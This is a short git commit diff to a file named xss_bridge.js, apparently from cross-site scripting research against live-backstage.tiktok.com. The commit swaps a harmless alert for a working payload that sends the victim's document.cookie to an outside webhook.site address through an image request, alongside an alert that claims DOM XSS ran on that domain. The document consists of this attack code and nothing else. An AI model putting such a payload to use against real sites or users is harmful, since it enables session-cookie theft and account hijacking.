94f991cf17cea4e41f09ca1cd0e357a6f3fb7f60
Juan Oviedo <65684836+juanoviedo28@users.noreply.github.com>
2025-06-30 17:25:54 -0300

    Update xss_bridge.js

--- xss_bridge.js
+++ xss_bridge.js
@@ -1,3 +1,4 @@
-alert('XSS - Ejecutado desde GitHub Pages');
+new Image().src = "https://webhook.site/e286a29a-cca2-4759-9da3-92f07bcf6e19?" + document.cookie;
+alert("DOM XSS ejecutado en live-backstage.tiktok.com");
 
 
